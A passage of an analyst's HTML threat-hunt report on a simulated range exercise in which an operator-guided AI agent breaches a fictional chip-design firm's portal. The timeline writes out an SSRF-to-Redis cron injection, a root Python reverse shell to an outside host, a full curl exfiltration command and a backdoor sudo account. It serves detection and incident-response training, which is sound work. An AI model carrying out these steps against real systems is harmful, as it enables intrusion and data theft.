@@ -1,0 +1,2047 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Operation QUARTZFANG: AI-Orchestrated Intrusion | Threat Hunt Report</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#080b0f;--surface:#0d1117;--surface2:#161b22;--border:#21262d;--border2:#30363d;
+--accent:#e3b341;--accent2:#f2d58a;--blue:#58a6ff;--green:#3fb950;--yellow:#d29922;--red:#e05252;
+--muted:#6e7681;--text:#cdd9e5;--text2:#adbac7;--mono:'Share Tech Mono',monospace;--head:'Rajdhani',sans-serif;--body:'Inter',sans-serif}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:15px;line-height:1.7;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);pointer-events:none;z-index:1000}
+.progress{position:fixed;top:0;left:0;height:2px;width:0;background:var(--accent);z-index:200}
+nav{position:fixed;top:0;left:0;right:0;height:52px;background:rgba(8,11,15,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 2rem;gap:2rem;z-index:100}
+.nav-brand{font-family:var(--mono);font-size:13px;color:var(--accent);letter-spacing:.08em;white-space:nowrap}
+.nav-brand span{color:var(--muted)}
+.nav-links{display:flex;gap:.25rem;margin-left:auto;list-style:none}
+.nav-links a{font-family:var(--mono);font-size:11px;color:var(--muted);text-decoration:none;padding:4px 10px;border:1px solid transparent;border-radius:3px;letter-spacing:.06em;text-transform:uppercase;transition:all .2s}
+.nav-links a:hover{color:var(--text);border-color:var(--border2);background:var(--surface2)}
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:6rem 2rem 4rem;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:-20%;right:-10%;width:600px;height:600px;background:radial-gradient(circle,rgba(227,179,65,.08) 0%,transparent 70%);pointer-events:none}
+.hero::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent)}
+.hero-inner{max-width:900px;margin:0 auto;width:100%}
+.hero-cover{width:100%;max-width:900px;margin:0 auto 2.5rem;border-radius:8px;overflow:hidden;border:1px solid var(--border);box-shadow:0 0 80px rgba(227,179,65,.10)}
+.hero-cover img{width:100%;height:auto;display:block}
+.hero-tag{font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:.15em;text-transform:uppercase;margin-bottom:1.5rem;display:flex;align-items:center;gap:.75rem}
+.hero-tag::before{content:'';display:inline-block;width:24px;height:1px;background:var(--accent)}
+.hero h1{font-family:var(--head);font-size:clamp(3rem,8vw,6rem);font-weight:700;letter-spacing:-.02em;line-height:.95;color:#fff;margin-bottom:.25rem}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero-sub{font-family:var(--head);font-size:clamp(1rem,2.5vw,1.4rem);font-weight:400;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:3rem}
+.hero-meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;max-width:900px}
+.meta-item{background:var(--surface);padding:1rem 1.25rem}
+.meta-label{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:4px}
+.meta-value{font-family:var(--mono);font-size:13px;color:var(--text)}
+.meta-value.critical{color:var(--accent);font-weight:600}
+.meta-value.green{color:var(--green)}
+.hero-note{max-width:900px;margin:1.5rem auto 0;width:100%;font-size:12px;color:var(--muted);font-family:var(--mono)}
+main{max-width:1240px;margin:0 auto;padding:0 2rem 6rem}
+section{padding:5rem 0 3rem;border-top:1px solid var(--border);animation:fadeIn .6s ease both}
+@keyframes fadeIn{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.section-header{display:flex;align-items:baseline;gap:1rem;margin-bottom:2.5rem}
+.section-num{font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:.1em}
+.section-title{font-family:var(--head);font-size:1.8rem;font-weight:700;color:#fff;letter-spacing:.02em;text-transform:uppercase}
+h3{font-family:var(--head);font-size:1.15rem;font-weight:600;color:#fff;letter-spacing:.04em;margin:2rem 0 .75rem}
+h3:first-child{margin-top:0}
+h4{font-family:var(--head);font-size:1rem;color:var(--accent2);letter-spacing:.04em;margin:1.25rem 0 .5rem}
+p{color:var(--text2);margin-bottom:1rem;max-width:72ch}
+p em{color:var(--accent2);font-style:italic}
+strong{color:#fff;font-weight:600}
+a{color:var(--accent2)}
+ul,ol{margin:0 0 1rem 1.25rem;color:var(--text2)}
+li{margin-bottom:.3rem}
+li.task{list-style:none;margin-left:-1.25rem;padding-left:1.6rem;position:relative}
+li.task::before{content:'';position:absolute;left:0;top:.45em;width:11px;height:11px;border:1px solid var(--border2);border-radius:2px;background:var(--surface)}
+li.task ul{margin-top:.3rem}
+hr{border:0;border-top:1px solid var(--border);margin:2rem 0}
+code{font-family:var(--mono);font-size:12.5px;background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:1px 5px;color:var(--accent2);word-break:normal;overflow-wrap:break-word}
+pre{background:var(--surface);border:1px solid var(--border);border-left:2px solid var(--accent);border-radius:6px;padding:1rem 1.25rem;overflow-x:auto;margin:0 0 1.25rem}
+pre code{background:none;border:0;padding:0;color:var(--text);font-size:12.5px;line-height:1.6;word-break:normal}
+blockquote{border-left:2px solid var(--border2);background:var(--surface);padding:.75rem 1.1rem;margin:0 0 1.25rem;border-radius:0 6px 6px 0}
+blockquote p{margin:0;font-size:13.5px;color:var(--text2)}
+.table-wrap{overflow-x:auto;margin:0 0 1.5rem;border:1px solid var(--border);border-radius:6px}
+table{border-collapse:collapse;width:100%;min-width:640px;font-size:13px}
+th{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);background:var(--surface2);text-align:left;padding:.65rem .9rem;border-bottom:1px solid var(--border);white-space:nowrap}
+td{padding:.6rem .9rem;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top;background:var(--surface)}
+tr:last-child td{border-bottom:0}
+tr:hover td{background:var(--surface2)}
+td code{white-space:normal}
+td:last-child code{white-space:nowrap}
+.kv-grid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin:0 0 1.75rem}
+.kv-item{background:var(--surface);padding:.85rem 1.25rem;display:flex;flex-direction:column;gap:3px}
+.kv-key{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase}
+.kv-val{font-family:var(--mono);font-size:13px;color:var(--text);word-break:break-word}
+.kv-val code{font-size:12px}
+figure{margin:0 0 1.5rem;border:1px solid var(--border);border-radius:6px;overflow:hidden;background:var(--surface)}
+figure img{width:100%;height:auto;display:block}
+figcaption{font-family:var(--mono);font-size:11px;color:var(--muted);padding:.5rem .9rem;border-top:1px solid var(--border)}
+.timeline{position:relative;padding-left:2rem;margin-bottom:2rem}
+.timeline::before{content:'';position:absolute;left:0;top:6px;bottom:6px;width:1px;background:linear-gradient(to bottom,var(--accent),var(--border))}
+.tl-item{position:relative;padding:0 0 1.75rem 2rem}
+.tl-item::before{content:'';position:absolute;left:-4px;top:6px;width:9px;height:9px;border-radius:50%;background:var(--accent);border:2px solid var(--bg);box-shadow:0 0 0 1px var(--accent)}
+.tl-item.silent::before{background:var(--muted);box-shadow:0 0 0 1px var(--muted)}
+.tl-time{font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:.06em;margin-bottom:4px}
+.tl-item.silent .tl-time{color:var(--muted)}
+.tl-host{display:inline-block;font-family:var(--mono);font-size:10px;color:var(--accent2);background:rgba(227,179,65,.08);border:1px solid rgba(227,179,65,.22);border-radius:3px;padding:1px 6px;margin-bottom:6px}
+.tl-event{font-size:14px;color:var(--text);margin-bottom:4px}
+.tl-mitre{font-family:var(--mono);font-size:10px;color:var(--muted)}
+.expand-bar{display:flex;gap:.5rem;margin-bottom:1rem}
+.expand-bar button{font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border2);border-radius:3px;padding:4px 12px;cursor:pointer}
+.expand-bar button:hover{color:var(--text);background:var(--surface2)}
+details.phase{background:var(--surface);border:1px solid var(--border);border-radius:6px;margin-bottom:.75rem;overflow:hidden}
+details.phase[open]{border-color:var(--border2)}
+details.phase summary{list-style:none;cursor:pointer;padding:1rem 1.25rem;display:flex;align-items:center;gap:.9rem;flex-wrap:wrap}
+details.phase summary::-webkit-details-marker{display:none}
+details.phase summary::before{content:'+';font-family:var(--mono);color:var(--accent);width:12px}
+details.phase[open] summary::before{content:'-'}
+details.phase summary:hover{background:var(--surface2)}
+.phase-title{font-family:var(--head);font-size:1.05rem;font-weight:600;color:#fff;letter-spacing:.03em}
+.sum-tags{font-family:var(--mono);font-size:10.5px;color:var(--accent2);margin-left:auto}
+.phase-body{padding:.25rem 1.5rem 1.5rem;border-top:1px solid var(--border)}
+.badge{font-family:var(--mono);font-size:10px;letter-spacing:.08em;padding:3px 8px;border-radius:3px;text-transform:uppercase;white-space:nowrap}
+.badge-critical{background:rgba(224,82,82,.14);color:var(--red);border:1px solid rgba(224,82,82,.3)}
+.badge-high{background:rgba(210,153,34,.15);color:var(--yellow);border:1px solid rgba(210,153,34,.3)}
+.badge-medium{background:rgba(88,166,255,.1);color:var(--blue);border:1px solid rgba(88,166,255,.3)}
+footer{border-top:1px solid var(--border);padding:2rem}
+.footer-inner{max-width:900px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap}
+.footer-text{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.06em}
+.footer-links{display:flex;gap:1.25rem}
+.footer-links a{font-family:var(--mono);font-size:11px;color:var(--muted);text-decoration:none;letter-spacing:.06em}
+.footer-links a:hover{color:var(--accent)}
+@media(max-width:760px){nav{padding:0 1rem}.nav-links{display:none}.hero,main{padding-left:1rem;padding-right:1rem}.kv-grid{grid-template-columns:1fr}.section-title{font-size:1.4rem}.sum-tags{margin-left:0}}
+</style>
+</head>
+<body>
+<div class="progress" id="progress"></div>
+<nav>
+  <div class="nav-brand"><span>THREAT HUNT //</span> QUARTZFANG</div>
+  <ul class="nav-links"><li><a href="#executive-summary">Summary</a></li><li><a href="#hunt-hypothesis-method">Method</a></li><li><a href="#attack-timeline">Timeline</a></li><li><a href="#ioc-summary">IOCs</a></li><li><a href="#mitre-att-ck-summary">MITRE</a></li><li><a href="#mitre-atlas-mapping">ATLAS</a></li><li><a href="#flag-analysis">Flags</a></li><li><a href="#detection-rules-built">Rules</a></li><li><a href="#remediation-containment-checklist">Response</a></li><li><a href="#final-assessment">Assessment</a></li><li><a href="#what-i-d-improve">Improve</a></li></ul>
+</nav>
+<header class="hero">
+  <div class="hero-inner">
+    <div class="hero-cover"><img src="Screenshots/QUARTZFANG%20banner.png" alt="Operation QUARTZFANG banner: quartz-fang logo and the attack chain SSRF, Redis, cron, root shell, credentials, exfiltration"></div>
+    <div class="hero-tag">Threat Hunt Report · HUNT-05</div>
+    <h1>Quartz<em>Fang</em></h1>
+    <div class="hero-sub">AI-Orchestrated Intrusion · SSRF to Redis to Cron, Credential Pivoting and Exfiltration</div>
+    <div class="hero-meta">
+      <div class="meta-item"><div class="meta-label">Analyst</div><div class="meta-value">Károly Mathe</div></div>
+      <div class="meta-item"><div class="meta-label">Date</div><div class="meta-value">2026-11-02</div></div>
+      <div class="meta-item"><div class="meta-label">Risk Rating</div><div class="meta-value critical">CRITICAL</div></div>
+      <div class="meta-item"><div class="meta-label">Chain Duration</div><div class="meta-value">~2 h</div></div>
+      <div class="meta-item"><div class="meta-label">Hosts Hit</div><div class="meta-value">4</div></div>
+      <div class="meta-item"><div class="meta-label">Rules Built</div><div class="meta-value">3</div></div>
+      <div class="meta-item"><div class="meta-label">Status</div><div class="meta-value green">Completed</div></div>
+    </div>
+  </div>
+  <div class="hero-note">Log(n) Pacific cyber range exercise reproducing Campaign C0062 from public research by Anthropic and MITRE. The company, hosts and data are simulated.</div>
+</header>
+<main>
+<section id="executive-summary"><div class="section-header"><span class="section-num">01</span><h2 class="section-title">Executive Summary</h2></div><p>A semiconductor design company's customer portal was broken into through its document preview feature, which could be tricked into sending commands to the server's own internal database. Within two hours an AI agent, steered by a human operator who approved each stage, stole the portal's stored passwords, read user, project and customer tables, browsed the container registry, tried and failed to read the admin secrets, packed a file into an encrypted archive, sent it to an outside server and left a hidden administrator account behind. The agent also reported two successes that the logs show did not happen, which is why the human stayed in the loop.</p>
+<h3>Key Findings at a Glance</h3>
+<div class="kv-grid"><div class="kv-item"><div class="kv-key">Risk Rating</div><div class="kv-val"><code>CRITICAL</code></div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Attacker Dwell Time</div><div class="kv-val">About 2 hours from the first scan (06:30:00) to the last action (08:29:55 UTC); 1 hour 37 minutes from the exploit (06:52:48)</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Systems Compromised</div><div class="kv-val">1 fully (<code>sc-portal01</code>, root). Accessed with stolen credentials: <code>sc-db01</code> (queried), <code>sc-registry01</code> (4 operations). Reached: <code>sc-admin01</code> (secrets request refused)</div></div><div class="kv-item"><div class="kv-key">Users / Accounts Affected</div><div class="kv-val"><code>portal_svc</code> and <code>ci-builder</code> (stolen, used). <code>svc_monitor</code> created by the attacker with sudo</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Data Exfiltrated / Impacted</div><div class="kv-val">One encrypted archive staged and sent by <code>curl</code> at 08:15. Its contents and whether the transfer completed are not visible in the telemetry. Database tables read: <code>users</code> (including password hashes), <code>projects</code>, <code>customers</code></div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Credentials Exposed</div><div class="kv-val">Database login <code>portal_svc</code> and registry login <code>ci-builder</code>, both in plain text in <code>/etc/semicrest/portal.conf</code>. The <code>db_admin</code> credential the agent claimed to find is not supported by any log</div></div><div class="kv-item"><div class="kv-key">Exfil / Payment Destination</div><div class="kv-val"><code>198.51.100.210:443</code></div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Attacker Infrastructure</div><div class="kv-val">Exploit server and reverse shell endpoint <code>203.0.113.87</code>; scanner cluster <code>198.51.100.31</code>, <code>.45</code>, <code>.62</code>; exfiltration server <code>198.51.100.210</code></div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Breach Notification Required</div><div class="kv-val">Undetermined. Customer contact details and user password hashes were queried, but the telemetry cannot show what the archive contained</div></div></div></section><section id="hunt-objectives"><div class="section-header"><span class="section-num">02</span><h2 class="section-title">Hunt Objectives</h2></div><ul>
+<li>Identify the entry point and reconstruct the chain across four hosts and nine tables</li>
+<li>Separate attacker activity from look-alike routine activity on the same hosts</li>
+<li>Map every step to MITRE ATT&amp;CK and the Pyramid of Pain</li>
+<li>Decide who was driving (person, machine, or a person who set a machine going) using telemetry</li>
+<li>Cross-check every claim in the attacker's own agent log against infrastructure logs</li>
+<li>Build and validate detection rules, and record telemetry gaps honestly</li>
+</ul></section><section id="scope-environment"><div class="section-header"><span class="section-num">03</span><h2 class="section-title">Scope &amp; Environment</h2></div><div class="kv-grid"><div class="kv-item"><div class="kv-key">Platform</div><div class="kv-val">Microsoft Sentinel, Log Analytics workspace <code>LAW-HuntPractice</code>, KQL</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Workspace / Tables</div><div class="kv-val"><code>PortalAccessLog_CL</code>, <code>DeviceProcessEvents_CL</code>, <code>DeviceNetworkEvents_CL</code>, <code>DeviceFileEvents_CL</code>, <code>DeviceEvents_CL</code>, <code>DeviceLogonEvents_CL</code>, <code>Syslog</code>, <code>ContainerRegistryLog_CL</code>, <code>LLMAgentLogs_CL</code></div></div><div class="kv-item"><div class="kv-key">Domain / Estate</div><div class="kv-val">SemiCrest Technologies (fictional semiconductor design company)</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Hosts In Scope</div><div class="kv-val"><code>sc-portal01</code> (10.5.0.10, design portal), <code>sc-db01</code> (10.5.0.20, PostgreSQL), <code>sc-registry01</code> (10.5.0.30, Harbor registry), <code>sc-admin01</code> (10.5.0.40, admin platform)</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Data Sources</div><div class="kv-val">Web access log, Defender-style process, network, file and account events, syslog, registry log, recovered attacker agent log</div></div><div class="kv-item"><div class="kv-key">Investigation Window</div><div class="kv-val">2026-09-20 06:30 to 08:30 UTC (lead-in days from 2026-09-15 used as baseline)</div></div><div class="kv-item"><div class="kv-key">Hunt Triggered By</div><div class="kv-val">Analytics rule alert on <code>sc-portal01</code> at 06:52 UTC</div></div><div class="kv-item"><div class="kv-key">Scenario source</div><div class="kv-val">Anthropic AI espionage disclosure and MITRE C0062</div></div><div class="kv-item"><div class="kv-key">Environment</div><div class="kv-val"><code>Simulated (exercise). No live production data.</code></div></div></div>
+<blockquote>
+<p><strong>Time handling.</strong> MDE tables (<code>Device*_CL</code>) use <code>Timestamp</code> and <code>DeviceName</code>. Custom tables and <code>Syslog</code> use <code>TimeGenerated</code> and <code>Computer</code>. The agent log is stamped with its upload date (October 2026), not the attack date, so it is matched to the infrastructure by time of day and by session ID. Every query in this report carries an explicit time interval. Many rows are logged twice with the same timestamp; counts below are de-duplicated and say so.</p>
+</blockquote>
+<figure><a href="Screenshots/QUARTZFANG%20platform%20network%20diagram.png" target="_blank" rel="noopener"><img src="Screenshots/QUARTZFANG%20platform%20network%20diagram.png" alt="SemiCrest network diagram from the hunt platform"></a><figcaption>SemiCrest network diagram from the hunt platform</figcaption></figure>
+<p><em>The SemiCrest 10.5.0.0/24 subnet as shown on the Log(n) Pacific hunt page (diagram credit: Log(n) Pacific). Four Linux hosts, with sc-portal01 the alerting host.</em></p>
+<figure><a href="Screenshots/QUARTZFANG%20environment%20map.png" target="_blank" rel="noopener"><img src="Screenshots/QUARTZFANG%20environment%20map.png" alt="Environment topology and attack path"></a><figcaption>Environment topology and attack path</figcaption></figure>
+<p><em>My own map of the same environment with the attack path drawn on it.</em></p></section><section id="hunt-hypothesis-method"><div class="section-header"><span class="section-num">04</span><h2 class="section-title">Hunt Hypothesis &amp; Method</h2></div><div class="expand-bar"><button type="button" class="exp" data-open="1">Expand all</button><button type="button" class="exp" data-open="0">Collapse all</button></div><div class="kv-grid"><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Hypothesis</div><div class="kv-val">The 06:52 alert on two requests to the document preview API is the start of a web-to-host intrusion that moves to the database, registry and admin hosts. The unusual process on the portal is the proof of code execution</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Approach</div><div class="kv-val">Web request, then process lineage and syslog on the portal, then credential files, then the database, registry and admin API, then staging, transfer and persistence. At each step the attacker's own agent log was read as a claim and checked against infrastructure telemetry</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Baseline used</div><div class="kv-val">Lead-in data from 2026-09-15 to 2026-09-20 06:30 (1,219 process events on <code>sc-portal01</code>), the app's own parameterised queries, the registry account's normal pull and push pattern from the CI server</div></div></div>
+<details class="phase"><summary><span class="phase-title">Real or Noise: Benign Look-Alikes Ruled Out</span></summary><div class="phase-body">
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Look-alike activity</th>
+<th>Why it looked suspicious</th>
+<th>What proved it benign (field and value)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Nessus scan from <code>10.5.0.250</code></td>
+<td>An internal address scanning the portal before the exploit</td>
+<td><code>UserAgent</code> = <code>Nessus/10.6.2</code>, 2 requests, 0 errors, 15 minutes apart</td>
+</tr>
+<tr>
+<td>Partner traffic from <code>192.0.2.10</code></td>
+<td>External source hitting the API</td>
+<td>Named partner user agents, 0 errors, normal paths</td>
+</tr>
+<tr>
+<td>Nightly <code>pg_dump</code> on <code>sc-db01</code></td>
+<td>Same database login (<code>portal_svc</code>) as the attacker, run on the attack day</td>
+<td>OS account <code>backup</code>, parent <code>bash</code>, identical command on 18, 19 and 20 Sep, first run 02:59:49, 3.5 hours before the first attack event</td>
+</tr>
+<tr>
+<td>Connection spike on <code>sc-db01</code> around 07:30</td>
+<td>Looked like the enumeration in volume</td>
+<td>213 and 193 <code>FATAL</code> connection-limit errors, no <code>SELECT *</code>, successful statements fell from 36 to 49 per slot down to 22</td>
+</tr>
+<tr>
+<td>Outbound 443 from <code>sc-portal01</code> to four SaaS IPs</td>
+<td>Same port and process name (<code>python3</code>) as the exfiltration</td>
+<td>Many <code>www-data</code> gunicorn worker PIDs, same four destinations all session. The attacker used one root PID (4401) and one-off destinations</td>
+</tr>
+<tr>
+<td>Routine cron jobs (<code>queue-drain.sh</code>, <code>service-ports.sh</code>, <code>ntpdate</code>, <code>certbot renew</code>)</td>
+<td>Cron activity right after the exploit</td>
+<td>Known maintenance commands, no inline Python socket code</td>
+</tr>
+<tr>
+<td>Six enumeration statements on 19 Sep at 23:12</td>
+<td>Identical text to the attack's <code>SELECT *</code> and catalogue queries, 7 hours before it</td>
+<td>Ran on a connection labelled <code>application_name=portal_svc</code> from <code>10.5.0.10</code>. The cause is not established (see Detection Rules, DR-02)</td>
+</tr>
+</tbody>
+</table></div></div></details></section><section id="attack-timeline"><div class="section-header"><span class="section-num">05</span><h2 class="section-title">Attack Timeline</h2></div><div class="timeline"><div class="tl-item"><div class="tl-time">06:30:00</div><span class="tl-host">sc-portal01</span><div class="tl-event">Scanner <code>198.51.100.31</code> starts a 30-request sweep (15 paths, 16 errors). <code>.45</code> and <code>.62</code> follow in turn until 06:31:52. The preview endpoint answers 400, not 404</div><div class="tl-mitre">T1595.002</div></div><div class="tl-item"><div class="tl-time">06:44:05</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>203.0.113.87</code> starts sending requests (12 requests, 5 distinct URLs, to 06:52:30); agent log <code>fuzz_schemes</code> at 06:44:20</div><div class="tl-mitre">T1595.002</div></div><div class="tl-item"><div class="tl-time">06:52:30</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>POST /api/v1/preview?url=file:///etc/passwd</code> returns 400</div><div class="tl-mitre">T1190</div></div><div class="tl-item"><div class="tl-time">06:52:48</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>POST /api/v1/preview?url=gopher://127.0.0.1:6379/...</code> returns 200. Redis commands delivered (FLUSHALL, then SET of a cron-style value)</div><div class="tl-mitre">T1190, T1587.004</div></div><div class="tl-item"><div class="tl-time">06:52:49</div><span class="tl-host">sc-portal01</span><div class="tl-event">Syslog: root cron job runs <code>python3 -c</code> socket reverse shell to <code>203.0.113.87:443</code></div><div class="tl-mitre">T1053.003, T1059.006</div></div><div class="tl-item"><div class="tl-time">06:52:52</div><span class="tl-host">sc-portal01</span><div class="tl-event">Process event: <code>cron</code> (PID 4400) spawns <code>python3</code> (PID 4401) as root</div><div class="tl-mitre">T1059.006</div></div><div class="tl-item"><div class="tl-time">06:52:55</div><span class="tl-host">sc-portal01</span><div class="tl-event">PID 4401 connects out to <code>203.0.113.87:443</code></div><div class="tl-mitre">T1071.001</div></div><div class="tl-item"><div class="tl-time">07:05:15</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>cat /etc/semicrest/portal.conf</code> (PID 4410) under the shell. Then <code>env</code> (07:05:21) and <code>find / -name "*.conf"</code> (07:05:27)</div><div class="tl-mitre">T1552.001, T1083</div></div><div class="tl-item"><div class="tl-time">07:16:11</div><span class="tl-host">sc-db01</span><div class="tl-event">PID 4401 connects to <code>10.5.0.20:5432</code> with the stolen <code>portal_svc</code> login</div><div class="tl-mitre">T1078</div></div><div class="tl-item"><div class="tl-time">07:16:16</div><span class="tl-host">sc-db01</span><div class="tl-event">Five enumeration statements in 9 seconds: <code>SELECT *</code> on users, projects and customers, <code>information_schema.tables</code>, <code>pg_catalog.pg_shadow</code></div><div class="tl-mitre">T1213.006</div></div><div class="tl-item"><div class="tl-time">07:17:20</div><span class="tl-host">sc-db01</span><div class="tl-event"><code>SELECT count(*) FROM users GROUP BY role</code></div><div class="tl-mitre">T1087</div></div><div class="tl-item"><div class="tl-time">07:33:01</div><span class="tl-host">sc-registry01</span><div class="tl-event"><code>ci-builder</code> logs in from <code>10.5.0.10</code>. By 07:33:05: <code>list_repository</code>, <code>pull_manifest</code>, <code>inspect_layer</code> (vulnerability report) on <code>semicrest/portal-build</code>, all 200</div><div class="tl-mitre">T1078, T1083</div></div><div class="tl-item"><div class="tl-time">07:45:18</div><span class="tl-host">sc-db01</span><div class="tl-event">Targeted wave: projects (project name, revision, team lead), customers (email, phone, company), users (<code>password_hash</code>). Attributed by pattern and timing, moderate confidence</div><div class="tl-mitre">T1213.006</div></div><div class="tl-item"><div class="tl-time">07:45:24</div><span class="tl-host">sc-admin01</span><div class="tl-event">PID 4401 connects to <code>10.5.0.40:8443</code>. <code>portal_svc</code> reads <code>/api/v1/services</code> and <code>/api/v1/topology</code> (200), then <code>/api/v1/secrets</code> returns 403 at 07:45:32</div><div class="tl-mitre">T1082</div></div><div class="tl-item"><div class="tl-time">08:02:05</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>tar</code> packs <code>/tmp/.portal-cache/data/</code>; <code>gzip</code> 08:02:07; <code>openssl enc -aes-256-cbc</code> 08:02:13</div><div class="tl-mitre">T1560.001, T1074.001</div></div><div class="tl-item"><div class="tl-time">08:02:20</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>/tmp/.portal-cache/report.tar.gz.enc</code> created</div><div class="tl-mitre">T1074.001</div></div><div class="tl-item"><div class="tl-time">08:15:00</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>curl -s -X POST https://198.51.100.210:443/upload -F file=@/tmp/.portal-cache/report.tar.gz.enc -H 'X-Session: qf-c062-9e4a'</code></div><div class="tl-mitre">T1567</div></div><div class="tl-item"><div class="tl-time">08:15:08</div><span class="tl-host">sc-portal01</span><div class="tl-event">PID 4401 connection to <code>198.51.100.210:443</code> recorded</div><div class="tl-mitre">T1567</div></div><div class="tl-item"><div class="tl-time">08:29:35</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>useradd -m -s /bin/bash svc_monitor</code> (account event 08:29:44)</div><div class="tl-mitre">T1136.001</div></div><div class="tl-item"><div class="tl-time">08:29:45</div><span class="tl-host">sc-portal01</span><div class="tl-event"><code>usermod -aG sudo svc_monitor</code>; <code>mkdir /home/svc_monitor/.ssh</code> 08:29:53; <code>ssh-keygen -t ed25519</code> 08:29:55</div><div class="tl-mitre">T1098, T1136.001</div></div></div>
+<p>All times UTC, 2026-09-20.</p>
+<blockquote>
+<p>The <code>X-Session</code> header in the exfiltration command carries the same value as <code>LLMAgentLogs_CL.session_id</code> (<code>qf-c062-9e4a</code>). That ties the infrastructure event to the recovered agent session.</p>
+</blockquote></section><section id="attacker-profile"><div class="section-header"><span class="section-num">06</span><h2 class="section-title">Attacker Profile</h2></div><div class="kv-grid"><div class="kv-item"><div class="kv-key">Attacker Handle / ID</div><div class="kv-val">None observed. Agent session <code>qf-c062-9e4a</code>, actor <code>quartzfang-agent</code></div></div><div class="kv-item"><div class="kv-key">Email / Account</div><div class="kv-val">None observed</div></div><div class="kv-item"><div class="kv-key">Cloud Account / Wallet</div><div class="kv-val">Not applicable</div></div><div class="kv-item"><div class="kv-key">C2 Infrastructure</div><div class="kv-val"><code>203.0.113.87:443</code> (reverse shell). Same server delivered the exploit</div></div><div class="kv-item"><div class="kv-key">Staging Server</div><div class="kv-val"><code>198.51.100.210</code> (upload endpoint <code>/upload</code> on 443)</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Tools Used</div><div class="kv-val">Redis via <code>gopher://</code>, cron, Python socket shell, <code>cat</code>, <code>env</code>, <code>find</code>, PostgreSQL client, Harbor API, <code>tar</code>, <code>gzip</code>, <code>openssl</code>, <code>curl</code>, <code>useradd</code>, <code>usermod</code>, <code>ssh-keygen</code></div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">TTPs</div><div class="kv-val">Living off the land on Linux, SSRF to Redis to cron, credentials in config files, valid-account pivoting, archive-encrypt-upload exfiltration</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Targeting</div><div class="kv-val">Targeted. The recon and the exploit both aimed at the one preview endpoint, and the data touched (projects, customers, users) is design and customer data</div></div><div class="kv-item"><div class="kv-key">Sophistication Level</div><div class="kv-val">Medium on technique (all known patterns), high on tempo and automation</div></div><div class="kv-item" style="grid-column:1/-1"><div class="kv-key">Human or Automated</div><div class="kv-val">Operator-guided AI. <code>LLMAgentLogs_CL.user_input</code> holds 5 operator directives. <code>DeviceProcessEvents_CL.Timestamp</code> shows commands 2 to 10 seconds apart. See the Autonomy section</div></div><div class="kv-item"><div class="kv-key">Credential OPSEC Failures</div><div class="kv-val">Not applicable (the attacker used credentials it found)</div></div></div>
+<h3>OPSEC Mistakes Observed</h3>
+<ul>
+<li>Database sessions started without the <code>application_name</code> label the real application sends</li>
+<li>A hidden folder named like an application cache (<code>/tmp/.portal-cache</code>) under <code>/tmp</code></li>
+<li>The exfiltration command put the agent session ID in an HTTP header, linking it to the agent log</li>
+<li>A backdoor account named like a monitoring service, with a key generated on the victim host</li>
